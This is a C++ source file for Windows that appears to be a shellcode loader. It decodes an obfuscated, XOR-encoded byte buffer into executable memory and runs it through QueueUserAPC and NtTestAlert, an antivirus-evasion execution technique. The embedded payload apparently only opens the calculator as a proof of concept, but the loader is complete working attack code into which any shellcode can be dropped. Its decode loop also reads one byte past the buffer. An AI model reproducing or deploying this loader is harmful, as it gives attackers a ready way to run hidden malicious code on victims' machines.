#include <Windows.h>

#pragma comment(lib, "ntdll")
using myNtTestAlert = NTSTATUS(NTAPI*)();

int main()
{
	unsigned char buf[] = "\xae\x1a\xd1\xb6\xa2\xba\x92\x52\x52\x52\x13\x3\x13\x2\x0\x3\x4\x1a\x63\x80\x37\x1a\xd9\x0\x32\x1a\xd9\x0\x4a\x1a\xd9\x0\x72\x1a\xd9\x20\x2\x1a\x5d\xe5\x18\x18\x1f\x63\x9b\x1a\x63\x92\xfe\x6e\x33\x2e\x50\x7e\x72\x13\x93\x9b\x5f\x13\x53\x93\xb0\xbf\x0\x13\x3\x1a\xd9\x0\x72\xd9\x10\x6e\x1a\x53\x82\xd9\xd2\xda\x52\x52\x52\x1a\xd7\x92\x26\x35\x1a\x53\x82\x2\xd9\x1a\x4a\x16\xd9\x12\x72\x1b\x53\x82\xb1\x4\x1a\xad\x9b\x13\xd9\x66\xda\x1a\x53\x84\x1f\x63\x9b\x1a\x63\x92\xfe\x13\x93\x9b\x5f\x13\x53\x93\x6a\xb2\x27\xa3\x1e\x51\x1e\x76\x5a\x17\x6b\x83\x27\x8a\xa\x16\xd9\x12\x76\x1b\x53\x82\x34\x13\xd9\x5e\x1a\x16\xd9\x12\x4e\x1b\x53\x82\x13\xd9\x56\xda\x1a\x53\x82\x13\xa\x13\xa\xc\xb\x8\x13\xa\x13\xb\x13\x8\x1a\xd1\xbe\x72\x13\x0\xad\xb2\xa\x13\xb\x8\x1a\xd9\x40\xbb\x5\xad\xad\xad\xf\x1a\xe8\x53\x52\x52\x52\x52\x52\x52\x52\x1a\xdf\xdf\x53\x53\x52\x52\x13\xe8\x63\xd9\x3d\xd5\xad\x87\xe9\xa2\xe7\xf0\x4\x13\xe8\xf4\xc7\xef\xcf\xad\x87\x1a\xd1\x96\x7a\x6e\x54\x2e\x58\xd2\xa9\xb2\x27\x57\xe9\x15\x41\x20\x3d\x38\x52\xb\x13\xdb\x88\xad\x87\x31\x33\x3e\x31\x52";
	myNtTestAlert testAlert = (myNtTestAlert)(GetProcAddress(GetModuleHandleA("ntdll"), "NtTestAlert"));
	SIZE_T shellSize = sizeof(buf);
	LPVOID shellAddress = VirtualAlloc(NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	int n = 0;


	for (int i = 0; i <= sizeof(buf); i++) {
		char DecodedOpCode = buf[i] ^ 0x01 ^ 0x7b ^ 0xf7 ^ 0x32 ^ 0x11 ^ 0xd8 ^ 0xa3 ^ 0xc7 ^ 0x52 ^ 0x12;
		if (WriteProcessMemory(GetCurrentProcess(), LPVOID((ULONG_PTR)shellAddress + n), &DecodedOpCode, 1, NULL)) {
			n++;
		}

	}

	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
	QueueUserAPC((PAPCFUNC)apcRoutine, GetCurrentThread(), NULL);
	testAlert();

	return 0;
}
